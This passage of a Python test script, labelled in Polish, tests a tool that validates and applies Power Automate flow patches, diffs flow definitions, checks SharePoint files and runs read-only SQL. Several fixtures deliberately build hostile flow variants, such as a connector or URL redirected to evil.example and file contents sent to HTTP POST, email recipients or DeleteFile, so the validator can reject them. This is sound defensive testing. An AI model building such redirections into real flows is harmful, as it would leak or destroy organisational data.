    if os.name == "nt":
        subprocess.run(["cmd", "/c", "rmdir", str(LINK_INC)], capture_output=True)
    else:
        LINK_INC.unlink()
else:
    print("  (pominieto test dowiazania: brak uprawnien do utworzenia)")

ALL1 = WORK / "zgloszenia/MIG-3/backup"
ALL1.mkdir(parents=True, exist_ok=True)
(ALL1 / f"{WF3}-20261101T120000Z.json").write_text("{}", encoding="utf-8")
with contextlib.redirect_stdout(io.StringIO()):
    P.migrate_all_legacy_backups()
expect("migracja: wszystkie zgloszenia, nie tylko biezace", (C.backup_dir("MIG-3") / f"{WF3}-20261101T120000Z.json").is_file(), True)

audit_before = (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").count('"narzedzie": "Read"')
guard_in(S31, "Read", {"file_path": str(KOPIA)}, OTHER)
expect("dziennik: odmowa Read zapisana",
       (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").count('"narzedzie": "Read"'), audit_before + 1)
last_fd = json.loads((WORK / "zgloszenia/FD-1/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("dziennik wykonania: odnosnik kopii do planu",
       str(last_fd.get("kopia_plan", "")).startswith("backup/") and Path(last_fd["kopia"]).name == last_fd["kopia_plan"][7:],
       True)

print("31. 1.3.0: nazwa pliku w sciezce odczytu SharePoint (ITS-418) i flow-diff")
P = importlib.reload(P)
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
cfg["dataverse_urls"] = [DV]
C.save_config(cfg)
SPDS = "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis"
TPL_OLD, TPL_NEW = "20260920_SZABLON_rozliczenie_PPFE_CZYSTY.xlsx", "20261102_SZABLON_rozliczenie_PPFE_CZYSTY.xlsx"
SPHOST = {"connectionName": "shared_sharepointonline", "apiId": "/providers/Microsoft.PowerApps/apis/shared_sharepointonline"}


def sp_action(op, params, ra=None):
    return {"type": "OpenApiConnection", "runAfter": ra or {},
            "inputs": {"host": {**SPHOST, "operationId": op}, "parameters": params,
                       "authentication": "@parameters('$authentication')"}}


DEF5 = {"properties": {"connectionReferences": {"shared_sharepointonline": {"connection": {"connectionReferenceLogicalName": "eko_sp"}}},
                       "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init_TemplateFilePath": {"type": "InitializeVariable", "runAfter": {},
                              "inputs": {"variables": [{"name": "TemplateFilePath", "type": "string"}]}},
    "Init_Filename": {"type": "InitializeVariable", "runAfter": {"Init_TemplateFilePath": ["Succeeded"]},
                      "inputs": {"variables": [{"name": "Filename", "type": "string", "value": "wynik.xlsx"}]}},
    "Switch": {"type": "Switch", "runAfter": {"Init_Filename": ["Succeeded"]}, "expression": "@x", "cases": {
        "Case_9": {"case": "FAR", "actions": {"Set_variable_6": {"type": "SetVariable", "runAfter": {},
                                                                 "inputs": {"name": "TemplateFilePath", "value": TPL_OLD}}}}},
               "default": {"actions": {}}},
    "Get_file_content_using_path": sp_action("GetFileContentByPath", {
        "dataset": SPDS, "path": "/Shared Documents/Rozliczenia niestandardowe/Template/@{variables('TemplateFilePath')}",
        "inferContentType": True}, {"Switch": ["Succeeded"]}),
    "Get_metadata_literal": sp_action("GetFileMetadataByPath", {
        "dataset": SPDS, "path": "/Shared Documents/Rozliczenia niestandardowe/Template/stary.xlsx"}, {"Switch": ["Succeeded"]}),
    "Create_file": sp_action("CreateFile", {"dataset": SPDS, "folderPath": "/Shared Documents/Wyniki",
                                            "name": "@variables('Filename')",
                                            "body": "@body('Get_file_content_using_path')"},
                             {"Get_file_content_using_path": ["Succeeded"]})}}}}
SETV = ["properties", "definition", "actions", "Switch", "cases", "Case_9", "actions", "Set_variable_6", "inputs", "value"]
GRAPH_STATE = {"plik": 200}
SITE_ID = "colpro.sharepoint.com,867882b1-a6f8-44b6-b7c7-63d7e0ac5d65,66c033ad-8f81-4439-abf1-797d3d64f936"
FD5 = FakeFlow()
FD5.reset(definition=DEF5)


def graph_and_dv(m, u, b=None, timeout=90, headers=None):
    if u.startswith("https://graph.microsoft.com/v1.0/sites/colpro.sharepoint.com:/sites/BazadokumentowEkovoltis"):
        return 200, json.dumps({"id": SITE_ID}).encode()
    if u.startswith(f"https://graph.microsoft.com/v1.0/sites/{SITE_ID}/drives"):
        return 200, json.dumps({"value": [{"id": "d-inna", "webUrl": SPDS + "/Inne"},
                                          {"id": "d-1", "webUrl": SPDS + "/Shared%20Documents"}]}).encode()
    if u.startswith("https://graph.microsoft.com/v1.0/drives/d-1/root:/Rozliczenia%20niestandardowe/Template/"):
        GRAPH_STATE["url"] = u
        if GRAPH_STATE["plik"] == 200:
            return 200, json.dumps({"name": TPL_NEW, "lastModifiedDateTime": "2026-11-02T08:00:00Z",
                                    "lastModifiedBy": {"user": {"displayName": "Anna Biznes"}}}).encode()
        return GRAPH_STATE["plik"], b'{"error": {"code": "x"}}'
    if "connectionreferences" in u:
        return 200, b'{"value": [{"connectionid": "shared-sharepointonl-1"}]}'
    return FD5(m, u, b, timeout, headers)


P.http = graph_and_dv


def fp5(changes, evidence=False, incident="SPF-1"):
    step = {"nr": 1, "opis": "Nowy szablon rozliczenia FAR PPFE", "typ": "flow-patch", "srodowisko": DV,
            "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z", "zmiany": changes}
    head = fp_plan([]).replace("FP-1", incident).split("## Kroki")[0]
    if evidence:
        head = head.replace("## Plan wycofania", "## Dowód istnienia pliku\nMichał Kaszta, 04.11.2026 10:40, folder "
                                                  "Template w przeglądarce: plik 20261102_SZABLON... jest.\n\n## Plan wycofania")
    return head + "## Kroki\n```json\n" + json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n"


ok_change = [{"sciezka": SETV, "bylo": TPL_OLD, "ma_byc": TPL_NEW}]
code, txt = plan_check(fp5(ok_change), "SPF-1")
expect("ITS-418: plan-check przechodzi z oznaczeniem wyjatku", (code, "[wyjatek: nazwa pliku w sciezce odczytu SharePoint]" in txt), (None, True))
expect("ITS-418: plik sprawdzony w Graph", ("plik istnieje" in txt, "Anna Biznes" in txt), (True, True))
expect("ITS-418: Graph pyta o plik w tym samym folderze", GRAPH_STATE.get("url", "").split("?")[0].endswith(
    "/Template/20261102_SZABLON_rozliczenie_PPFE_CZYSTY.xlsx"), True)
GRAPH_STATE["plik"] = 404
code, txt = plan_check(fp5(ok_change), "SPF-1")
expect("ITS-418: brak pliku w folderze odrzucony", (code, "nie ma pliku" in txt), (2, True))
expect("ITS-418: brak pliku odrzucony takze z dowodem", plan_check(fp5(ok_change, evidence=True), "SPF-1")[0], 2)
GRAPH_STATE["plik"] = 403
code, txt = plan_check(fp5(ok_change), "SPF-1")
expect("ITS-418: bez dostepu i bez dowodu odrzucony", (code, "Dowód istnienia pliku" in txt), (2, True))
code, txt = plan_check(fp5(ok_change, evidence=True), "SPF-1")
expect("ITS-418: bez dostepu, z dowodem od czlowieka", (code, "nie sprawdzone odczytem: dowod od czlowieka" in txt), (None, True))
GRAPH_STATE["plik"] = 200
for label, new in [("ukosnik", "../" + TPL_NEW), ("folder", "OLD/" + TPL_NEW), ("inne rozszerzenie", TPL_NEW[:-5] + ".xlsm"),
                   ("wyrazenie", "@{variables('X')}.xlsx"), ("kodowanie", "a%2Fb.xlsx"), ("bez rozszerzenia", "szablon")]:
    expect(f"ITS-418: odrzucone ({label})", plan_check(fp5([{"sciezka": SETV, "bylo": TPL_OLD, "ma_byc": new}]), "SPF-1")[0], 2)
A5 = ["properties", "definition", "actions"]
for label, change in [
    ("dataset akcji odczytu", {"sciezka": A5 + ["Get_file_content_using_path", "inputs", "parameters", "dataset"],
                               "bylo": SPDS, "ma_byc": "https://colpro.sharepoint.com/sites/Inna"}),
    ("dataset akcji CreateFile", {"sciezka": A5 + ["Create_file", "inputs", "parameters", "dataset"],
                                  "bylo": SPDS, "ma_byc": "https://colpro.sharepoint.com/sites/Inna"}),
    ("zmienna uzyta w CreateFile", {"sciezka": A5 + ["Init_Filename", "inputs", "variables", "0", "value"],
                                    "bylo": "wynik.xlsx", "ma_byc": "inny.xlsx"}),
    ("path akcji odczytu z innym folderem", {"sciezka": A5 + ["Get_metadata_literal", "inputs", "parameters", "path"],
                                             "bylo": "/Shared Documents/Rozliczenia niestandardowe/Template/stary.xlsx",
                                             "ma_byc": "/Shared Documents/Inny/stary.xlsx"}),
]:
    expect(f"ITS-418: nadal odrzucone: {label}", plan_check(fp5([change]), "SPF-1")[0], 2)
code, txt = plan_check(fp5([{"sciezka": A5 + ["Get_metadata_literal", "inputs", "parameters", "path"],
                             "bylo": "/Shared Documents/Rozliczenia niestandardowe/Template/stary.xlsx",
                             "ma_byc": "/Shared Documents/Rozliczenia niestandardowe/Template/" + TPL_NEW}]), "SPF-1")
expect("ITS-418: literal w path akcji odczytu (ta sama sciezka folderu)", (code, "[wyjatek:" in txt), (None, True))


def variant(change):
    d = copy.deepcopy(DEF5)
    change(d["properties"]["definition"]["actions"])
    return d


for label, change in [
    ("zmienna takze w CreateFile", lambda a: a["Create_file"]["inputs"]["parameters"].update(name="@variables('TemplateFilePath')")),
    ("zmienna nie jako caly segment", lambda a: a["Get_file_content_using_path"]["inputs"]["parameters"].update(
        path="/Shared Documents/Template/v_@{variables('TemplateFilePath')}")),
    ("wyrazenie w folderze", lambda a: a["Get_file_content_using_path"]["inputs"]["parameters"].update(
        path="/Shared Documents/@{triggerBody()['f']}/@{variables('TemplateFilePath')}")),
    ("operacja zapisu", lambda a: a["Get_file_content_using_path"]["inputs"]["host"].update(operationId="UpdateFileByPath")),
    ("inny konektor", lambda a: a["Get_file_content_using_path"]["inputs"]["host"].update(apiId="/providers/x/apis/shared_onedriveforbusiness")),
    ("zmienna w Compose", lambda a: a.update(Cmp={"type": "Compose", "runAfter": {}, "inputs": "@variables('TemplateFilePath')"})),
    ("dataset wyrazeniem", lambda a: a["Get_file_content_using_path"]["inputs"]["parameters"].update(dataset="@{variables('Site')}")),
]:
    exc, why = C.sp_filename_exception(variant(change), ok_change[0])
    expect(f"ITS-418: wyjatek nie obejmuje: {label}", (exc is None, bool(why)), (True, True))
expect("ITS-418: wyjatek obejmuje przypadek z briefu", bool(C.sp_filename_exception(DEF5, ok_change[0])[0]), True)

text = fp5(ok_change, incident="SPF-2")
plan_check(text, "SPF-2")
accept("SPF-2", text)
expect("ITS-418: exec", run_exec("SPF-2"), None)
expect("ITS-418: nowa nazwa zapisana", C.get_at(json.loads(FD5.clientdata), SETV), TPL_NEW)
entry = json.loads((WORK / "zgloszenia/SPF-2/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("ITS-418: wyjatek w dzienniku", [w.get("plik_sprawdzony") for w in entry.get("wyjatek", [])], ["jest"])
FD5.reset(definition=DEF5)
GRAPH_STATE["plik"] = 404
text = fp5(ok_change, evidence=True, incident="SPF-3")
GRAPH_STATE["plik"] = 200
plan_check(text, "SPF-3")
accept("SPF-3", text)
GRAPH_STATE["plik"] = 404  # plik zniknal miedzy akceptacja a wykonaniem
expect("ITS-418: exec sprawdza plik ponownie", run_exec("SPF-3"), 4)
expect("ITS-418: nic nie zapisano", FD5.patches, [])
GRAPH_STATE["plik"] = 200

print("   flow-diff")
FD5.reset(definition=DEF5)
after5 = copy.deepcopy(DEF5)
a5 = after5["properties"]["definition"]["actions"]
a5["Switch"]["cases"]["Case_9"]["actions"]["Set_variable_6"]["inputs"]["value"] = TPL_NEW
del a5["Init_TemplateFilePath"]["runAfter"]
a5["Create_file"]["inputs"]["authentication"] = "@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']"
after5["properties"]["connectionReferences"]["shared_sharepointonline"]["connection"]["name"] = "shared-sharepointonl-1"
before5 = copy.deepcopy(after5)
before5["properties"]["definition"]["actions"]["Switch"]["cases"]["Case_9"]["actions"]["Set_variable_6"]["inputs"]["value"] = TPL_OLD
before5["properties"]["definition"]["actions"]["Init_TemplateFilePath"]["runAfter"] = {}
del before5["properties"]["connectionReferences"]["shared_sharepointonline"]["connection"]["name"]
before5["properties"]["definition"]["templateName"] = ""
FD5.clientdata = json.dumps({**after5, "properties": {**after5["properties"]}}, ensure_ascii=False)
del a5["Create_file"]["inputs"]["authentication"]
FD5.clientdata = json.dumps(after5, ensure_ascii=False)
before5["properties"]["definition"]["actions"]["Create_file"]["inputs"]["authentication"] = \
    "@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']"
(WORK / "zgloszenia/SPF-1/flow-przed.json").write_text(json.dumps({"clientdata": json.dumps(before5)}), encoding="utf-8")
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.cmd_flow_diff(["SPF-1", DV, WF3, "flow-przed.json"])
out_txt = buf.getvalue()
expect("flow-diff: jedna zmiana merytoryczna", "Roznice merytoryczne: 1" in out_txt, True)
expect("flow-diff: zmiana Set_variable_6", "Set_variable_6" in out_txt, True)
expect("flow-diff: serializacja rozpoznana", "Roznice serializacji designera: 4" in out_txt, True)
expect("flow-diff: te same connectionReferences", "connectionReferences: te same" in out_txt, True)
saved = list((WORK / "zgloszenia/SPF-1").glob(f"flow-diff-{WF3}-*.json"))
expect("flow-diff: wynik zapisany w katalogu zgloszenia", len(saved), 1)
for label, args in [("plik spoza zgloszenia", ["SPF-1", DV, WF3, "../SPF-2/plan.md"]),
                    ("plan.md", ["SPF-1", DV, WF3, "plan.md"]),
                    ("Dataverse spoza listy", ["SPF-1", "https://obce.crm4.dynamics.com", WF3, "flow-przed.json"])]:
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            P.cmd_flow_diff(args)
        expect(f"flow-diff: odrzucone: {label}", "przeszlo", "odmowa")
    except SystemExit:
        expect(f"flow-diff: odrzucone: {label}", "odmowa", "odmowa")
expect("straznik: ppcall flow-diff", decision(f"{Q} flow-diff SPF-1 {DV} {WF3} flow-przed.json"), "allow")
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("32. 1.3.0 po przegladzie: wynik odczytu w routingu, parametry zapisu, kolizje nazw, nazwy plikow, flow-diff")
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
C.save_config(cfg)


def live5(changes, definition):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]


OK5 = [{"sciezka": SETV, "bylo": TPL_OLD, "ma_byc": TPL_NEW}]
expect("po przegladzie: przypadek z briefu nadal przechodzi", live5(OK5, DEF5), [])
for label, change in [
    ("wynik odczytu w id DeleteFile", lambda a: a.update(Usun=sp_action("DeleteFile", {"dataset": SPDS, "id": "@{body('Get_file_content_using_path')?['Id']}"}))),
    ("wynik odczytu w uri Http", lambda a: a.update(H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://x/@{body('Get_file_content_using_path')}"}})),
    ("wynik odczytu przez Compose do Http", lambda a: a.update(
        Cmp={"type": "Compose", "runAfter": {}, "inputs": "@body('Get_file_content_using_path')"},
        H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "@{outputs('Cmp')}"}})),
    ("akcja nazwana jak zmienna w routingu", lambda a: (a["Switch"]["cases"]["Case_9"]["actions"].update(
        TemplateFilePath=a["Switch"]["cases"]["Case_9"]["actions"].pop("Set_variable_6")),
        a.update(H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://x/@{body('TemplateFilePath')}"}}))),
    ("wynik settera czytany przez Compose", lambda a: a.update(Cmp={"type": "Compose", "runAfter": {}, "inputs": "@outputs('Set_variable_6')"})),
    ("apiId spoza Microsoft", lambda a: a["Get_file_content_using_path"]["inputs"]["host"].update(apiId="https://evil.example/x/shared_sharepointonline")),
    ("typ ApiConnection", lambda a: a["Get_file_content_using_path"].update(type="ApiConnection")),
]:
    d = variant(change)
    path = SETV if "TemplateFilePath" not in str(d["properties"]["definition"]["actions"]["Switch"]["cases"]["Case_9"]["actions"].keys()) else SETV[:-3] + ["TemplateFilePath", "inputs", "value"]
    expect(f"po przegladzie: odrzucone: {label}", bool(live5([{"sciezka": path, "bylo": TPL_OLD, "ma_byc": TPL_NEW}], d)), True)
d_lit = variant(lambda a: a.update(Usun=sp_action("DeleteFile", {"dataset": SPDS, "id": "@{body('Get_metadata_literal')?['Id']}"})))
expect("po przegladzie: literal path, wynik w DeleteFile",
       bool(live5([{"sciezka": A5 + ["Get_metadata_literal", "inputs", "parameters", "path"],
                    "bylo": "/Shared Documents/Rozliczenia niestandardowe/Template/stary.xlsx",
                    "ma_byc": "/Shared Documents/Rozliczenia niestandardowe/Template/" + TPL_NEW}], d_lit)), True)
d_w = variant(lambda a: a.update(Req=sp_action("HttpRequest", {"dataset": SPDS, "parameters/method": "GET", "parameters/uri": "_api/web"}),
                                 Mv=sp_action("MoveFileAsync", {"dataset": SPDS, "destinationFolderPath": "/A"})))
for label, path, old, new in [
    ("SP HttpRequest parameters/method", A5 + ["Req", "inputs", "parameters", "parameters/method"], "GET", "DELETE"),
    ("SP HttpRequest parameters/uri", A5 + ["Req", "inputs", "parameters", "parameters/uri"], "_api/web", "_api/x"),
    ("MoveFile destinationFolderPath", A5 + ["Mv", "inputs", "parameters", "destinationFolderPath"], "/A", "/B"),
    ("CreateFile folderPath", A5 + ["Create_file", "inputs", "parameters", "folderPath"], "/Shared Documents/Wyniki", "/X"),
    ("CreateFile name", A5 + ["Create_file", "inputs", "parameters", "name"], "@variables('Filename')", "x.xlsx"),
]:
    static = C.flow_patch_path_problem(path)
    expect(f"po przegladzie: zapis SP odrzucony: {label}", bool(static) or bool(live5([{"sciezka": path, "bylo": old, "ma_byc": new}], d_w)), True)
expect("po przegladzie: CreateFile body nadal dozwolone",
       live5([{"sciezka": A5 + ["Create_file", "inputs", "parameters", "body"], "bylo": "@body('Get_file_content_using_path')",
               "ma_byc": "@body('Get_file_content_using_path')?['x']"}], DEF5), [])
for bad in ["x／y.xlsx", "a‮xcod.xlsx", "a​.xlsx", "CON.xlsx", "a .xlsx", "a\x7f.xlsx"]:
    expect(f"po przegladzie: nazwa odrzucona {bad!r}", bool(C.filename_problem(TPL_OLD, bad)), True)

d_sec = copy.deepcopy(DEF5)
d_sec["properties"]["definition"]["actions"]["H"] = {"type": "Http", "runAfter": {}, "inputs": {
    "method": "GET", "uri": "https://x", "headers": {"X-Key": "sekretnyklucz"},
    "authentication": {"type": "Basic", "username": "u", "password": "StaryHaslo1"}}}
d_sec2 = copy.deepcopy(d_sec)
d_sec2["properties"]["definition"]["actions"]["H"]["inputs"]["authentication"]["password"] = "NoweHaslo2"
d_sec2["properties"]["definition"]["actions"]["H"]["inputs"]["headers"]["X-Key"] = "innyklucz"
FD5.clientdata = json.dumps(d_sec2)
(WORK / "zgloszenia/SPF-1/przed-hasla.json").write_text(json.dumps(d_sec), encoding="utf-8")
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.cmd_flow_diff(["SPF-1", DV, WF3, "przed-hasla.json"])
leak = [w for w in ("StaryHaslo1", "NoweHaslo2", "sekretnyklucz", "innyklucz") if w in buf.getvalue()]
saved_texts = "".join(p.read_text(encoding="utf-8") for p in (WORK / "zgloszenia/SPF-1").glob("flow-diff-*.json"))
leak += [w for w in ("StaryHaslo1", "NoweHaslo2", "sekretnyklucz", "innyklucz") if w in saved_texts]
expect("flow-diff: hasla i naglowki zamaskowane (ekran i plik)", leak, [])
try:
    with contextlib.redirect_stdout(io.StringIO()):
        P.cmd_flow_diff(["SPF-1", DV, WF3, "PLAN.MD"])
    expect("flow-diff: PLAN.MD odrzucony", "przeszlo", "odmowa")
except SystemExit:
    expect("flow-diff: PLAN.MD odrzucony", "odmowa", "odmowa")
FD5.reset(definition=DEF5)
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("33. 1.3.0 po weryfikacji: request/url w InvokeHttp, result() zakresu")
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
C.save_config(cfg)
WEB = {"type": "OpenApiConnection", "runAfter": {}, "inputs": {
    "host": {"connectionName": "shared_webcontents", "operationId": "InvokeHttp",
             "apiId": "/providers/Microsoft.PowerApps/apis/shared_webcontents"},
    "parameters": {"request/method": "GET", "request/url": "https://graph.microsoft.com/v1.0/me"}}}
d_url = variant(lambda a: a.update(Web=copy.deepcopy(WEB)))
expect("InvokeHttp: literal request/url odrzucony",
       bool(C.flow_patch_path_problem(A5 + ["Web", "inputs", "parameters", "request/url"])), True)
d_url2 = variant(lambda a: a.update(Init_U={"type": "InitializeVariable", "runAfter": {},
                                            "inputs": {"variables": [{"name": "U", "type": "string", "value": "https://graph.microsoft.com"}]}},
                                    Web={**copy.deepcopy(WEB), "inputs": {**WEB["inputs"], "parameters": {
                                        "request/method": "GET", "request/url": "@{variables('U')}/v1.0/me"}}}))
expect("InvokeHttp: zmienna w request/url odrzucona",
       bool(live5([{"sciezka": A5 + ["Init_U", "inputs", "variables", "0", "value"], "bylo": "https://graph.microsoft.com",
                    "ma_byc": "https://evil.example"}], d_url2)), True)
d_res = variant(lambda a: (a.update(S={"type": "Scope", "runAfter": {}, "actions": {
    "Get_file_content_using_path": a.pop("Get_file_content_using_path")}}),
    a.update(Usun=sp_action("DeleteFile", {"dataset": SPDS, "id": "@{result('S')[0]['outputs']['body']['Id']}"}))))
expect("result(zakres): wynik odczytu przez result() odrzucony", bool(live5(OK5, d_res)), True)
expect("result(zakres): bez odwolania przechodzi", live5(OK5, variant(lambda a: a.update(S={"type": "Scope", "runAfter": {}, "actions": {
    "Get_file_content_using_path": a.pop("Get_file_content_using_path")}}))), [])
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("34. 1.3.0: wynik odczytu tylko do akcji wbudowanych i tresci zapisu SharePoint")
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
C.save_config(cfg)
MAIL = {"type": "OpenApiConnection", "runAfter": {}, "inputs": {
    "host": {"connectionName": "shared_office365", "operationId": "SendEmailV2",
             "apiId": "/providers/Microsoft.PowerApps/apis/shared_office365"},
    "parameters": {"emailMessage/To": "@{body('Get_file_content_using_path')?['adresat']}", "emailMessage/Body": "x"}}}
for label, change in [
    ("odbiorca maila z wyniku odczytu", lambda a: a.update(Mail=copy.deepcopy(MAIL))),
    ("odbiorca maila przez Compose", lambda a: a.update(
        Cmp={"type": "Compose", "runAfter": {}, "inputs": "@body('Get_file_content_using_path')"},
        Mail={**copy.deepcopy(MAIL), "inputs": {**MAIL["inputs"], "parameters": {"emailMessage/To": "@{outputs('Cmp')}"}}})),
    ("nazwa pliku w CreateFile z wyniku odczytu", lambda a: a["Create_file"]["inputs"]["parameters"].update(
        name="@{body('Get_file_content_using_path')?['n']}")),
]:
    expect(f"wynik odczytu: odrzucone: {label}", bool(live5(OK5, variant(change))), True)
expect("wynik odczytu: tresc CreateFile i Compose dozwolone", live5(OK5, variant(lambda a: a.update(
    Cmp={"type": "Compose", "runAfter": {}, "inputs": "@body('Get_file_content_using_path')"}))), [])
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("35. 1.3.0: petla po wyniku odczytu i result() zakresu z wartoscia z pliku")
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
C.save_config(cfg)
HTTP_ITEM = {"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "@{item()}"}}
for label, change in [
    ("Foreach po wyniku odczytu, Http z item()", lambda a: a.update(
        FE={"type": "Foreach", "runAfter": {}, "foreach": "@body('Get_file_content_using_path')?['wiersze']",
            "actions": {"H": copy.deepcopy(HTTP_ITEM)}})),
    ("Foreach po Compose z wyniku, CreateFile z item()", lambda a: a.update(
        Cmp={"type": "Compose", "runAfter": {}, "inputs": "@body('Get_file_content_using_path')"},
        FE={"type": "Foreach", "runAfter": {}, "foreach": "@outputs('Cmp')",
            "actions": {"CF": sp_action("CreateFile", {"dataset": SPDS, "folderPath": "/X", "name": "@{item()}", "body": "x"})}})),
    ("result() zakresu z Compose z wyniku", lambda a: a.update(
        S={"type": "Scope", "runAfter": {}, "actions": {"Cmp": {"type": "Compose", "runAfter": {},
                                                                "inputs": "@body('Get_file_content_using_path')"}}},
        H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "@{result('S')}"}})),
]:
    expect(f"wynik odczytu: odrzucone: {label}", bool(live5(OK5, variant(change))), True)
expect("Foreach niezalezny od pliku nie blokuje", live5(OK5, variant(lambda a: a.update(
    FE={"type": "Foreach", "runAfter": {}, "foreach": "@triggerBody()?['x']", "actions": {"H": copy.deepcopy(HTTP_ITEM)}}))), [])
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)

print("36. 1.3.0: dwa flow-diff w tej samej sekundzie")
FD5.reset(definition=DEF5)
(WORK / "zgloszenia/SPF-1/przed-sekunda.json").write_text(json.dumps(DEF5), encoding="utf-8")
real_now = P.C.now
P.C.now = lambda: real_now().replace(microsecond=0, second=7)
try:
    before_files = set((WORK / "zgloszenia/SPF-1").glob("flow-diff-*.json"))
    for _ in range(2):
        with contextlib.redirect_stdout(io.StringIO()):
            P.cmd_flow_diff(["SPF-1", DV, WF3, "przed-sekunda.json"])
    expect("flow-diff: dwa wyniki w tej samej sekundzie, bez bledu",
           len(set((WORK / "zgloszenia/SPF-1").glob("flow-diff-*.json")) - before_files), 2)
finally:
    P.C.now = real_now

print("37. 1.4.0: ppcall sql (tylko odczyt z Fabric SQL, ITS-426)")
P = importlib.reload(P)
SQLSRV = "ezpoaao4s3guzlluryza2wjh6y-pxnazkwsqg5etc62asdz35n22u.datawarehouse.fabric.microsoft.com"
SQLTOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOi.sqltajny.podpis"
SQL_ITS426 = ("SELECT * FROM dbo.iris_zuzycie_rozbicie WHERE ppe = '590556731701300006' "
              "AND data >= '2026-01-01' AND data < '2026-02-01'")
cfg = C.load_config()
cfg["fabric_sql_endpoints"] = [f"{SQLSRV}/ekovoltis"]
C.save_config(cfg)
(WORK / "zgloszenia/ITS-426").mkdir(parents=True, exist_ok=True)


class FakeCursor:
    def __init__(self, conn):
        self.conn, self.description, self.rows = conn, None, []

    def execute(self, q):
        self.conn.log.append(("execute", q))
        if q == "SELECT @@OPTIONS":
            self.description, self.rows = [("",)], [(self.conn.options,)]
            return
        if q == "BEGIN TRANSACTION":
            if FAKE_TRAN["begin_fails"]:
                raise Exception("BEGIN TRANSACTION is not supported")
            self.conn.trancount = FAKE_TRAN["count"]
            return
        if q == "SELECT @@TRANCOUNT":
            self.description, self.rows = [("",)], [(self.conn.trancount,)]
            return
        if q.startswith("IF @@TRANCOUNT > 0 ROLLBACK"):
            self.conn.trancount = 0
            return
        if self.conn.fail:
            raise Exception("[28000] Login failed for user '<token-identified principal>'. " + self.conn.fail)
        self.description = [("ppe",), ("data",), ("wartosc",)]
        import datetime as _d, decimal as _m
        self.rows = [("590556731701300006", _d.date(2026, 1, d), _m.Decimal("1.250")) for d in range(1, 8)]

    def fetchmany(self, n):
        return self.rows[:n]

    def fetchone(self):
        return self.rows[0] if self.rows else None


class FakeConn:
    def __init__(self, fail=""):
        self.log, self.fail, self.timeout, self.options = [], fail, None, FAKE_OPTIONS["v"]
        self.trancount = 0

    def cursor(self):
        return FakeCursor(self)

    def rollback(self):
        self.log.append(("rollback",))

    def close(self):
        self.log.append(("close",))


class FakeOdbc:
    def __init__(self, drivers=("ODBC Driver 18 for SQL Server",), fail=""):
        self._drivers, self.fail, self.connects = list(drivers), fail, []

    def drivers(self):
        return self._drivers

    def connect(self, conn_str, attrs_before=None, autocommit=True, timeout=0):
        conn = FakeConn(self.fail)
        self.connects.append({"conn_str": conn_str, "attrs": attrs_before, "autocommit": autocommit, "conn": conn})
        return conn


FAKE_OPTIONS = {"v": 2 | 32}
FAKE_TRAN = {"count": 1, "begin_fails": False}
ROLLBACK_TAIL = [("execute", "IF @@TRANCOUNT > 0 ROLLBACK TRANSACTION"), ("rollback",), ("close",)]
ODBC = FakeOdbc()
P._odbc = lambda: ODBC
P.get_token = lambda resource: (SQLTOKEN if resource == C.SQL_RESOURCE else "inny")
P.az_account = lambda: "e2vitservice@ekovoltis.pl"


def sql_run(*args):
    buf_out, buf_err = io.StringIO(), io.StringIO()
    code = 0
    with contextlib.redirect_stdout(buf_out), contextlib.redirect_stderr(buf_err):
        try:
            P.cmd_sql(list(args))
        except SystemExit as e:
            code = e.code
    return code, buf_out.getvalue() + buf_err.getvalue()


code, text = sql_run(SQLSRV, "ekovoltis", SQL_ITS426, "--out", "zgloszenia/ITS-426/zuzycie.json")
expect("sql: zapytanie ITS-426 wykonane", code, 0)
res_file = WORK / "zgloszenia/ITS-426/zuzycie_DANE_OSOBOWE.json"
expect("sql: plik wyniku z _DANE_OSOBOWE", res_file.exists(), True)
res = json.loads(res_file.read_text(encoding="utf-8"))
expect("sql: kolumny i wiersze w pliku", (res["kolumny"], res["liczba_wierszy"], res["wiersze"][0][2]),
       (["ppe", "data", "wartosc"], 7, "1.250"))
expect("sql: na ekranie podsumowanie, bez pelnego wyniku", ("Wierszy: 7" in text, text.count("590556731701300006")), (True, 3))
c0 = ODBC.connects[-1]
expect("sql: Fabric: ReadOnly, jawna transakcja przed zapytaniem, zawsze ROLLBACK i zamkniecie",
       ("ApplicationIntent=ReadOnly" in c0["conn_str"], c0["conn"].log[:3], c0["conn"].log[-3:]),
       (True, [("execute", "BEGIN TRANSACTION"), ("execute", "SELECT @@TRANCOUNT"), ("execute", SQL_ITS426)],
        ROLLBACK_TAIL))
expect("sql: token tylko w atrybucie 1256", (SQLTOKEN in c0["conn_str"], SQLTOKEN.encode("utf-16-le") in c0["attrs"][1256]),
       (False, True))
